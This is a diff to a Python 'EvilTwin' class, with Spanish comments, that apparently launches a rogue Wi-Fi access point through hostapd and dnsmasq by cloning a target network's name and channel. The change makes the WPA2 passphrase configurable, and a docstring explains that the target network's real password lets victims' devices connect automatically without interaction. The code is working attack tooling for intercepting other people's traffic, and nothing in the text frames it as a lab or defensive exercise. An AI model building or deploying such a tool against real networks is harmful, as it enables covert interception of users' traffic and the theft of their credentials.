@@ -52,7 +52,7 @@ class EvilTwin:
             return "g"
         return "a" if ch >= 36 else "g"
 
-    def _write_hostapd_conf(self, ssid, channel, security):
+    def _write_hostapd_conf(self, ssid, channel, security, wpa_passphrase="wiretrap123"):
         """Genera el archivo de configuración de hostapd"""
         hw_mode = self._hw_mode_for_channel(channel)
         # ieee80211n habilita 802.11n; en 5GHz añadimos ieee80211ac
@@ -70,7 +70,7 @@ channel={channel}
 {extra}macaddr_acl=0
 auth_algs=1
 wpa=2
-wpa_passphrase=wiretrap123
+wpa_passphrase={wpa_passphrase}
 wpa_key_mgmt=WPA-PSK
 rsn_pairwise=CCMP
 """
@@ -169,22 +169,26 @@ log-dhcp
         time.sleep(1)
 
     def start(self, ssid, channel=6,
-              security="OPEN", out_interface="eth0"):
+              security="OPEN", out_interface="eth0",
+              wpa_passphrase="wiretrap123"):
         """
         Lanza el evil twin completo.
 
         Args:
-            ssid:          Nombre de la red a clonar
-            channel:       Canal del AP objetivo
-            security:      OPEN o WPA2
-            out_interface: Interfaz con internet real (eth0, wlan0...)
+            ssid:           Nombre de la red a clonar
+            channel:        Canal del AP objetivo
+            security:       OPEN o WPA2
+            out_interface:  Interfaz con internet real (eth0, wlan0...)
+            wpa_passphrase: Contraseña WPA2 (idealmente la real del AP
+                            objetivo para que los clientes conecten
+                            automáticamente sin interacción)
         """
         if self.running:
             return
 
         try:
             self._kill_conflicts()
-            self._write_hostapd_conf(ssid, channel, security)
+            self._write_hostapd_conf(ssid, channel, security, wpa_passphrase)
             self._write_dnsmasq_conf()
             self._setup_interface(channel)
             self._enable_forwarding(out_interface)
